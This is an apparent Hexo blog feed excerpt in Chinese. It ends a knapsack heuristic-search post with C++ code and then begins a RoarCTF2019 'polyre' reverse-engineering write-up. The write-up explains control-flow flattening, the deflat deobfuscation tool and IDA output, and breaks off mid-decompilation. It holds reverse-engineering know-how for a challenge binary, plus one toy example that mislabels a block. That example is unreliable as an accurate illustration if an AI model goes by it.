res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;c[i])&#123;</span><br><span class="line">            ans+=v[i];</span><br><span class="line">            res-=c[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+d[i]*res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写出以下的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> c,v;</span><br><span class="line">    <span class="keyword">double</span> d;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;a[i].c)&#123;</span><br><span class="line">            ans+=a[i].v;</span><br><span class="line">            res-=a[i].c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+(<span class="keyword">int</span>)(a[i].d*res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=a[now].c)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-a[now].c,value+a[now].v);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now,contain)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> item &amp;a, <span class="keyword">const</span> item &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d &gt; b.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int cmp(item a,item b)&#123;</span></span><br><span class="line"><span class="comment">    if(a.d&lt;b.d)return 0;</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a[i].c,&amp;a[i].v);</span><br><span class="line">        a[i].d=(<span class="keyword">double</span>)a[i].v/a[i].c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功AC。</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2.png" alt="2"></p><p>由此可见，只要我们选的估值函数够好，那么搜索它就不会那么暴力了，这大概也是启发式搜索算法的精髓，只要估值函数选的好，复杂度能直接从指数级降到(其实我也不知道是多少hhh)，但是个人觉得，只要估值函数写出来了，都是没问题的，因为代码量本身就很少，只是在做决策之前估计以下这一步到底值不值得就好了，然后就是递归大法好，可以看到我的search函数本身就这几句。</p><p>那么在这样的搜索里面启发式算法的估值函数很容易求，但是如果是迷宫类的问题，启发式算法还真的就难说了，等明天去看看迷宫类的启发式搜索吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来快乐学算法了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="search" scheme="http://example.com/categories/icpc/algorithm/search/"/>
    
    
  </entry>
  
  <entry>
    <title>RoarCTF2019 polyre writeup writeup</title>
    <link href="http://example.com/2021/12/15/[RoarCTF2019]polyre%20writeup/"/>
    <id>http://example.com/2021/12/15/[RoarCTF2019]polyre%20writeup/</id>
    <published>2021-12-15T02:00:00.000Z</published>
    <updated>2021-12-15T12:25:49.419Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#[RoarCTF2019]polyre">RoarCTF2019 polyre</a></p><span id="more"></span><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>拿到文件ida打开，发现是很绝望的究极无敌的代码混淆——控制流平坦化。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/1.png" alt="1"></p><h3 id="控制流平坦化介绍"><a href="#控制流平坦化介绍" class="headerlink" title="控制流平坦化介绍"></a>控制流平坦化介绍</h3><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，例如下图是正常的执行流程 </p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/2.png" alt="2"></p><p>在经过控制流平台化的混淆之后，会变成如下的结构</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/3.png" alt="3"></p><p>流程图看起来就像是同一级的关系，块之间失去了层次分明，逻辑可读性变得更差。</p><p>就好比我们平时做的堆菜单题，选择菜单的时候，逻辑基本就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    menu();</span><br><span class="line"><span class="keyword">int</span> num=getnum();</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            error_choice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时候经过ida反编译并不是那么清晰的，我也不知道它是不是特意加了混淆还是ida本身的问题，反编译代码变成了下面的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                    menu();</span><br><span class="line"><span class="keyword">int</span> num=getnum();</span><br><span class="line">                    <span class="keyword">if</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    add();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                edit();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            show();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(num!=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        edit();</span><br><span class="line">&#125;</span><br><span class="line">    error_choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么说吧，两个代码实现的功能是一样的，但是明显下面的可读性就变差了很多。我也不知道是不是这个在作妖，就是觉得很像，提出来讲一讲hhh。</p><p>但是好像又没有关系，因为它们块之间的关系本来就是平坦的，后面只是用while替代switch进行进一步混淆，但是其实有menu函数一看便知，所以它在这里加这样的逻辑混淆的确是无用功。</p><p>那么我猜控制流平坦化的流程就是：</p><p>①将所有块平坦化</p><p>②用switch分发</p><p>③把switch转成如上的那种while循环包起来的代码。</p><p>至于平坦化了之后如何实现前后的逻辑的关系呢？其实很简单，比如下面这个逻辑</p><p>假如明天下雨，那么我带伞，然后出门，否则我带上我的自行车，然后出门，写成伪代码是下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rain)&#123;</span><br><span class="line">get_umb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">get_bike();</span><br><span class="line">&#125;</span><br><span class="line">go_out();</span><br></pre></td></tr></table></figure><p>代码这么写起来看起来逻辑还是十分清晰的，那么如果加控制流平坦化混淆它会变成什么样呢？这里很明显出现三个语句块，如果rain条件成立，那么get_umb()，否则get_bike()，最后一定会执行go_out()。那么get_umb和get_bike就是一个二选一的关系，这俩块跟go_out又是先后的关系，这是我们一眼可以看出来的逻辑。</p><p>控制流平坦化第一步就是拆掉他们这样的逻辑关系，甭管有多少块，全部用while(1)+switch去控制，如下代码所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ch=rain;</span><br><span class="line"><span class="keyword">switch</span>(ch)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>：</span><br><span class="line">get_bike();</span><br><span class="line">ch=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">get_umb();</span><br><span class="line">ch=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">get_bike();</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现平坦化了之后略微有一点点不可读，但是还能接受，但是它往往不会让你看的那么容易，因为它ch不可能就1，2，3，4这么给你弄好了，我再进一步加混淆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ch=(rain*<span class="number">2</span>+<span class="number">9876</span>)*<span class="number">9</span>+<span class="number">100</span>;</span><br><span class="line"><span class="keyword">switch</span>(ch)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">88984</span>：</span><br><span class="line">get_bike();</span><br><span class="line">ch=ch*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">89002</span>:</span><br><span class="line">get_umb();</span><br><span class="line">ch=(ch<span class="number">-18</span>)*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">800857</span>:</span><br><span class="line">get_bike();</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果块再多，运算再复杂，你可能都不能一眼看出来下不下雨和带不带伞是一个什么联系了。</p><p>然后switch再同如上的menu这样变换一下逻辑，就更难读了，也就是我们题目中看到的这个样子，可以发现，它平坦的块已经是特别密集了，疯狂while(1)然后中间条件判断去break。</p><p>以上分析均为自己个人理解，并使用自己最朴素的语言讲述出来的。</p><h3 id="抵抗控制流平坦化"><a href="#抵抗控制流平坦化" class="headerlink" title="抵抗控制流平坦化"></a>抵抗控制流平坦化</h3><p>既然有人研究出了这样的代码混淆，自然也有人研究出了对应的解法，这里放项目地址<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>该项目以angr作为依赖，在个人使用的时候我把它源码download下来还需要把它flat_control_flow目录下的deflat.py移动到上一层目录才能正常使用，使用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$python(3) deflat.py -f [file_name] --addr [function_addr]</span><br></pre></td></tr></table></figure><p>这里function_addr即为添加了此混淆的函数地址。放着跑个几分钟，就能跑出来一个控制流比较清晰的elf文件了。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/4.png" alt="4"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们用ida反编译能得到以下代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> 